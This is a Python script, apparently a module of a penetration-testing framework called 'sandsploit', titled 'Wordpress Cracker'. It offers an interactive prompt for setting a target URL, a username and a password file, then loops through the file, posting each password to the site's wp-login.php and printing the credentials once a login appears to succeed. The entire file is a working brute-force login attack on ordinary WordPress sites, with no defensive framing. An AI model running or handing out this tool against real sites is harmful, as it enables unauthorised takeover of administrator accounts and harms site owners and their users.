#!/usr/bin/python3
import requests , sys
from colorama import Fore

sys.path.append("/data/data/com.termux/files/usr/opt/sandsploit/core")
sys.path.append("/opt/sandsploit/core/")
import complator
name = "Wordpress Cracker"
author = "@Aμιρ-0x0 (AMJ)"
info = "a Tool for Cracking WP Admin User...."
HOST = None
USERNAME = None
PASSLIST = None
def help():
    print ("author              to show author name")
    print ("help                to show this massage")
    print ("info                to show description of the tool ")
    print ("set                 to set options such as : [set host http://google.com/]")
    print ("show_options        to show options of Tools")
    print ("exit                to quit from Tool")
    print ("run                 to Run Session")
def options():
    print ("options               value")
    print ("==========            ============")
    print ("host                  ",HOST)
    print ("username              ",USERNAME)
    print ("passlist              ",PASSLIST)
    print("\n\033[95mYou Must Enter URL with Protocol (Example : https://site.com or http://site.com)")
    print("\033[95mYou Must Write / at The End of URL EX: www.site.com/")
    print("\033[95mThe Password list must be addressed from the root directory EX:'/home/USER/Desktop/pass.txt'")

def run():
    wp_login = HOST+'/wp-login.php'
    wp_admin = 'http://%s/wp-admin/'%(HOST)
    
    pwo = open(PASSLIST,'r')
    with requests.Session() as s:
        headers1 = { 'Cookie':'wordpress_test_cookie=WP Cookie check' }
        for i in pwo :
            try:
                passl = i.strip('\n\r')

                datas={ 
                    'log':USERNAME, 'pwd':passl, 'wp-submit':'Log In', 
                    'redirect_to':wp_admin, 'testcookie':'1'  
                }
                r = s.post(wp_login, headers=headers1, data=datas)
                check = r.text
                if "https://wordpress.org/news/" in check:
                    
                    print (Fore.GREEN+"========================================\nUsername : %s \nPassword : %s"%(USERNAME,passl))
                    break
                else:
                    print (Fore.RED+"Password incorrect : %s"%passl)
            except:
                print ("Check Internet or Target......")

while True:
    try:
        option = input ("\033[96m┌─[SSF][\033[91m"+name+"\033[96m]\n└─▪ ")
        op2 = option.split(" ")
        if option == "help":
            help()
        elif option == "author":
            print (author)
        elif option == "info":
            print (info)

        elif option == "show_options":
            options()
        elif op2[0] == "set":
            op3 = op2[1].upper()    
            vars()[op3] = op2[2]
            print ("%s => %s"%(op2[1],op2[2]))
        elif option == "run":
            run()
        elif option == "exit":
            break
        else:
            print ("Wrong Command ! ")
    except:
        print ('Unkonwn Error !')